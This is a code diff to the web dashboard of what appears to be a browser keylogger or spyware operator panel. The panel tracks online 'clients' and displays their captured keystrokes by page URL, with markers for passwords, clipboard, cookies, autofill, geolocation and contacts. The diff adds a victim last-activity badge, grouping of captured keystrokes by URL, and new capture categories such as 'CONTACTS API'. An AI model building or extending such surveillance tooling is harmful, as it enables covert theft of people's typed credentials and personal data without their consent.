@@ -397,6 +397,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
             <button id="qf-errors" class="btn qf-btn" onclick="setQuickFilter('errors')" style="font-size:.6rem;padding:3px 8px;border-color:#d93025;color:#d93025">⚠️ Has Errors</button>
             <button id="live-mode-btn" class="btn" onclick="toggleLiveMode()" style="font-size:.6rem;padding:3px 10px;margin-left:8px">⚡ Live Mode</button>
             <span id="online-count-badge" style="font-size:.6rem;padding:3px 8px;margin-left:6px;background:rgba(11,138,11,.15);color:#0b8a0b;border-radius:10px;font-weight:600;display:none">🟢 0 online</span>
+            <span id="last-act-badge" style="font-size:.6rem;padding:3px 8px;margin-left:6px;color:var(--dim);display:none">⏱ last act: ?</span>
         </div>
     </div>
         <div class="tabs">
@@ -527,6 +528,9 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
         <div class="pnl-h">
             <h2>Keystrokes</h2>
             <input id="keys-search" type="search" placeholder="Filter keystrokes…" oninput="filterKeystrokes()" style="font-size:.7rem;padding:4px 8px;border:1px solid var(--border2);border-radius:5px;background:var(--bg2);color:var(--text);width:180px">
+            <label style="font-size:.6rem;display:flex;align-items:center;gap:4px;cursor:pointer" title="Group entries by page URL">
+                <input type="checkbox" id="keys-group-url" onchange="renderKeystrokes(window._lastKeys||[])" style="cursor:pointer"> Group by URL
+            </label>
             <button class="btn export" onclick="downloadKeystrokesCSV()" title="Download als CSV">⬇ CSV</button>
         </div>
         <div class="pnl-b np" id="key-log"><div class="empty">No keystrokes captured</div></div>
@@ -1512,6 +1516,15 @@ async function refreshAll() {
                     ocBadge.textContent = `🟢 ${oc} online`;
                     ocBadge.style.display = oc > 0 ? 'inline' : 'none';
                 }
+                // Last activity badge
+                const labBadge = $('#last-act-badge');
+                if (labBadge && stats.clients) {
+                    const maxSeen = Math.max(...Object.values(stats.clients).map(c => new Date(c.lastSeen||0).getTime()).filter(Boolean));
+                    if (maxSeen > 0) {
+                        labBadge.style.display = 'inline';
+                        labBadge.textContent = `⏱ last act: ${fmtAgo(new Date(maxSeen).toISOString())}`;
+                    }
+                }
                 deviceInfo = stats.deviceInfo || {};
                 renderClients(stats.clients);
                 updateFilterOptions(stats.clients);
@@ -1645,7 +1658,8 @@ function renderKeystrokes(keys) {
         'INPUT TYPE': '#fb7185', 'BEACON': '#c084fc', 'STORAGE SIZE': '#fde68a',
         'HISTORY': '#a5f3fc', 'CLIPBOARD WRITE': '#bbf7d0', 'SPA NAV': '#a5f3fc',
         'PASSWORD STRENGTH': '#f9a8d4',
-        'TEXTAREA': '#fde68a', 'VISIBILITY': '#bfdbfe', 'GEO UPDATE': '#6ee7b7'
+        'TEXTAREA': '#fde68a', 'VISIBILITY': '#bfdbfe', 'GEO UPDATE': '#6ee7b7',
+        'LABEL FOCUS': '#c7d2fe', 'CONTACTS API': '#a7f3d0'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -1654,18 +1668,25 @@ function renderKeystrokes(keys) {
             return `<span style="color:${c2};font-weight:600">${m}</span>`;
         });
     }
-    const rows = keys.map(k => {
+    const groupByUrl = document.getElementById('keys-group-url')?.checked;
+    let rows = '';
+    let lastUrl = null;
+    keys.forEach(k => {
+        if (groupByUrl && (k.url || '') !== lastUrl) {
+            lastUrl = k.url || '';
+            rows += `<div style="padding:5px 8px 3px;font-size:.6rem;color:var(--dim);border-top:1px solid var(--border2);margin-top:4px;word-break:break-all">\uD83D\uDD17 ${escHtml(lastUrl||'(unknown)')}</div>`;
+        }
         const safe = escHtml(k.keys || '');
         let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         highlighted = colorizeMarker(highlighted);
-        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR|BEACON|STORAGE|HISTORY|CLIPBOARD|SPA|PASSWORD|TEXTAREA|VISIBILITY|GEO)/.test(k.keys || '');
-        return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR|BEACON|STORAGE|HISTORY|CLIPBOARD|SPA|PASSWORD|TEXTAREA|VISIBILITY|GEO|LABEL|CONTACTS)/.test(k.keys || '');
+        rows += `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
-            ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
+            ${(!groupByUrl && k.url) ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
             <div class="key-text">${highlighted}</div>
         </div>`;
-    }).join('');
+    });
     const loadMore = (window._lastKeys || []).length === keysLimit
         ? `<div style="text-align:center;padding:14px"><button class="btn" onclick="keysLimit+=${100};loadKeystrokes()">Load more (${keysLimit}/${keysLimit} shown)</button></div>`
         : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${(window._lastKeys||[]).length} entries shown</div>`;
